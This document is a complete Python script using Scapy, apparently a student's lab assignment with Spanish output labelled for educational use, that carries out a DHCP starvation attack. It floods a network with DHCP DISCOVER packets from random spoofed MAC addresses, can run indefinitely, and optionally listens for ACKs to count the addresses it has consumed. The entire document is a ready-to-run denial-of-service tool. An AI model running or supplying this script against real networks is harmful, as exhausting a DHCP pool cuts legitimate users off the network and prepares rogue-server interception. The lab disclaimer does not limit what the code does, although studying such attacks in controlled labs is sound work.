#!/usr/bin/env python3
"""
DHCP Starvation Attack - Matricula 2025-0719
"""
import os
import sys
import time
import signal
import random
import argparse
import threading

from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff, conf

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
RESET  = "\033[0m"
BOLD   = "\033[1m"

BANNER = f"""
{RED}{BOLD}
╔══════════════════════════════════════════════════════════════╗
║        DHCP STARVATION TOOL  -  Matricula: 2025-0719         ║
║        SOLO PARA USO EDUCATIVO EN LABORATORIO CONTROLADO     ║
╚══════════════════════════════════════════════════════════════╝
{RESET}"""

discovers_sent = 0
acks_received  = 0
running        = True
ips_leased     = set()
lock           = threading.Lock()


def signal_handler(sig, frame):
    global running
    running = False
    print(f"\n{GREEN}{'─'*50}")
    print(f"  RESUMEN DHCP STARVATION")
    print(f"{'─'*50}")
    print(f"  DISCOVERs enviados : {discovers_sent}")
    print(f"  ACKs recibidos     : {acks_received}")
    print(f"  IPs consumidas     : {len(ips_leased)}")
    for ip in sorted(ips_leased):
        print(f"    [x] {ip}")
    print(f"{'─'*50}{RESET}")
    sys.exit(0)


def random_mac():
    first = (random.randint(0, 127) * 2) | 0x02
    rest  = [random.randint(0, 255) for _ in range(5)]
    return ":".join(f"{b:02x}" for b in [first] + rest)


def build_discover(src_mac, xid):
    mac_bytes = bytes.fromhex(src_mac.replace(":", ""))
    pkt = (
        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(
            op    = 1,
            xid   = xid,
            flags = 0x8000,
            chaddr= mac_bytes,
        )
        / DHCP(options=[
            ("message-type", "discover"),
            ("param_req_list", [1, 3, 6, 15, 51, 58, 59]),
            "end"
        ])
    )
    return pkt


def ack_listener(iface):
    global acks_received, ips_leased

    def process(pkt):
        global acks_received, ips_leased
        if DHCP not in pkt:
            return
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                if opt[1] == 5:  # ACK
                    ip = pkt[BOOTP].yiaddr if BOOTP in pkt else "?"
                    with lock:
                        acks_received += 1
                        ips_leased.add(ip)
                    print(f"\n  {GREEN}[ACK #{acks_received}]{RESET} IP asignada: {ip}")
                break

    sniff(iface=iface, filter="udp and port 68",
          prn=process, store=False,
          stop_filter=lambda p: not running)


def run_attack(iface, count, delay, wait_ack, verbose):
    global discovers_sent, running

    print(f"{CYAN}[*] Interfaz : {iface}{RESET}")
    print(f"{CYAN}[*] Paquetes : {'Infinito' if count == 0 else count}{RESET}")
    print(f"{YELLOW}[*] Iniciando DHCP Starvation... (Ctrl+C para detener){RESET}\n")

    conf.verb = 0

    if wait_ack:
        t = threading.Thread(target=ack_listener, args=(iface,), daemon=True)
        t.start()
        print(f"{CYAN}[*] Listener de ACKs iniciado{RESET}\n")

    while running:
        if count != 0 and discovers_sent >= count:
            break

        fake_mac = random_mac()
        xid      = random.randint(0, 0xFFFFFFFF)
        pkt      = build_discover(fake_mac, xid)

        try:
            sendp(pkt, iface=iface, verbose=False)
            discovers_sent += 1

            if verbose:
                print(f"{GREEN}[DISCOVER #{discovers_sent}]{RESET} MAC: {fake_mac}")
            elif discovers_sent % 50 == 0:
                print(f"{GREEN}[*]{RESET} DISCOVERs: {discovers_sent} | "
                      f"IPs consumidas: {len(ips_leased)}", end="\r")

            if delay > 0:
                time.sleep(delay)

        except PermissionError:
            print(f"\n{RED}[!] Requiere root{RESET}")
            sys.exit(1)
        except Exception as e:
            print(f"\n{RED}[!] Error: {e}{RESET}")

    signal_handler(None, None)


def parse_args():
    parser = argparse.ArgumentParser(description="DHCP Starvation - Matricula 2025-0719")
    parser.add_argument("-i", "--iface",   required=True,        help="Interfaz (ej: eth1)")
    parser.add_argument("-c", "--count",   type=int, default=0,  help="DISCOVERs (0=infinito)")
    parser.add_argument("-d", "--delay",   type=float, default=0.005, help="Delay segundos")
    parser.add_argument("--wait-ack",      action="store_true",  help="Escuchar ACKs")
    parser.add_argument("-v", "--verbose", action="store_true",  help="Modo verbose")
    return parser.parse_args()


if __name__ == "__main__":
    print(BANNER)
    signal.signal(signal.SIGINT, signal_handler)

    if os.geteuid() != 0:
        print(f"{RED}[!] Requiere root: sudo python3 {sys.argv[0]}{RESET}")
        sys.exit(1)

    args = parse_args()
    run_attack(args.iface, args.count, args.delay, args.wait_ack, args.verbose)
